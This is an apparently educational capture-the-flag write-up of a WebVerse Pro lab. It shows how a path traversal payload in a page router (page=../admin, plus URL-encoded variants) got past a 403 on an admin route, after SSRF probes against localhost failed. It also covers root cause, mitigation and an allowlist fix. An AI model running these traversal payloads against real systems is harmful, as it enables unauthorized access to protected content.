---
title: "Path Traversal Leads to Access Control Bypass | Gassed Up"
date: 2026-06-27 13:55:00 +0530
categories: [A01 - Broken Access Control, Path Traversal]
tags: [path-traversal, access-control-bypass, router-bypass, express, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/gassedup.webp
  alt: Gassed Up Path Traversal Access Control Bypass
---

## Lab Link

> Redacted lab instance  
> Platform: **WebVerse Pro**

---

## Overview

**Gassed Up** was a WebVerse Pro challenge based on a public-facing fuel company website.  
The application exposed normal marketing pages through a custom page router:

```http
/routers/pages?page=stations
/routers/pages?page=sourcing
/routers/pages?page=sustainability
/routers/pages?page=policies
/routers/pages?page=contact
```

At first, the challenge looked like it might involve SSRF because the application also used an in-house gateway-style image router. However, testing showed that full URLs passed to the page router caused a client-side redirect, while direct localhost URLs in the image router were blocked by an allowlist.

The actual vulnerability was a **path traversal issue in the page router**, which allowed bypassing the direct `/admin` access control check and rendering the internal admin console through:

```http
/routers/pages?page=../admin
```

---

## Objective

The goal was to access the internal operations/admin console and retrieve the exposed WebVerse token.

---

## Vulnerability Identification

The homepage showed that public content was loaded through router endpoints instead of direct static routes.

Example image loading pattern:

```html
<img src="/routers/images?img=forecourt.jpg">
<img src="/routers/images?img=refinery.jpg">
<img src="/routers/images?img=tanker.jpg">
<img src="/routers/images?img=pump.jpg">
<img src="/routers/images?img=office.jpg">
```

Example page loading pattern:

```http
GET /routers/pages?page=policies
```

The public router accepted known page names and rendered company pages. This made the `page` parameter an interesting target for route traversal and template loading abuse.

---

## Recon and Approach

First, I tested the obvious internal pages through the router:

```bash
for p in admin console operations ops dashboard status internal debug token access; do
  echo "===== $p ====="
  curl -ks "https://<redacted-host>/routers/pages?page=$p" | head -40
done
```

These returned the normal Gassed Up 404 template, meaning the simple page names were not enough.

Next, direct access to the admin route was checked:

```bash
curl -ksi "https://<redacted-host>/admin"
```

The route existed, but it returned:

```http
HTTP/2 403 Forbidden
```

This confirmed that `/admin` was a real protected route rather than a missing endpoint.

---

## SSRF Checks

Because the lab wording suggested an in-house gateway, I also tested SSRF-style payloads.

Testing localhost through the page router:

```http
GET /routers/pages?page=http://127.0.0.1
```

returned a redirect:

```http
HTTP/2 302 Found
Location: http://127.0.0.1
```

This showed that the server was not fetching the URL internally. It was simply redirecting the client.

Testing localhost through the image router:

```bash
curl -ksi "https://<redacted-host>/routers/images?img=http://127.0.0.1:3000/"
```

returned:

```text
image source not allowed
```

So SSRF was not the working path. The useful attack surface remained the page router.

---

## Exploitation

The bypass was found by using path traversal in the `page` parameter:

```http
GET /routers/pages?page=../admin
```

Equivalent curl command:

```bash
curl -ks "https://<redacted-host>/routers/pages?page=../admin"
```

URL-encoded variant:

```bash
curl -ks "https://<redacted-host>/routers/pages?page=..%2Fadmin"
```

To extract only the token:

```bash
curl -ks "https://<redacted-host>/routers/pages?page=../admin" | grep -o 'WEBVERSE{[^}]*}'
```

The direct `/admin` route was protected, but loading the same admin template through the page router bypassed that protection.

---

## Proof / Flag

The internal admin console was successfully rendered through:

```http
/routers/pages?page=../admin
```

The console exposed a WebVerse token in the expected format:

```text
WEBVERSE{REDACTED}
```

The flag is intentionally redacted in this public writeup.

---

## Root Cause

The root cause was insufficient validation and normalization of the `page` parameter.

The application likely treated `page` as a template or file path and joined it with a public pages directory. Because traversal sequences such as `../admin` were not rejected, the attacker could escape the intended public page directory and render a protected admin template.

The direct `/admin` route had an access control check, but the page router did not enforce the same authorization boundary.

---

## Impact

An attacker could bypass route-level access controls and access internal administrative content.

In this lab, the impact was:

- Access to the internal Operations Console
- Exposure of a sensitive WebVerse token
- Bypass of the direct `/admin` 403 restriction
- Unauthorized access to functionality or data intended only for internal users

---

## Mitigation

To prevent this issue:

1. Do not use raw user input to construct template or file paths.
2. Replace dynamic file loading with a strict allowlist of valid page slugs.
3. Normalize paths before use and reject traversal sequences such as `../`.
4. Ensure protected templates cannot be rendered through public routing logic.
5. Apply authorization checks at the resource/template level, not only at direct URL routes.
6. Add regression tests for traversal payloads such as:

```text
../admin
..%2Fadmin
../../admin
%2e%2e%2fadmin
```

A safer pattern would be:

```js
const allowedPages = new Set([
  "stations",
  "sourcing",
  "sustainability",
  "policies",
  "contact"
]);

if (!allowedPages.has(req.query.page)) {
  return res.status(404).send("Not found");
}
```

---

## Lessons Learned

This challenge was a good reminder that the apparent vulnerability theme can be misleading during initial testing.

The app looked like an SSRF challenge because it used gateway-style routers and image loading endpoints. However, the evidence showed:

- `page=http://127.0.0.1` caused a redirect, not SSRF.
- `img=http://127.0.0.1` was blocked by an image source allowlist.
- `/admin` existed but was forbidden.
- `page=../admin` bypassed the direct route protection.

The final bug was therefore **path traversal leading to access control bypass**, not SSRF.

---

## Final Classification

- **Vulnerability:** Path Traversal
- **Impact:** Access Control Bypass / Sensitive Token Disclosure
- **OWASP Top 10:2025:** A01 - Broken Access Control
- **Severity:** High
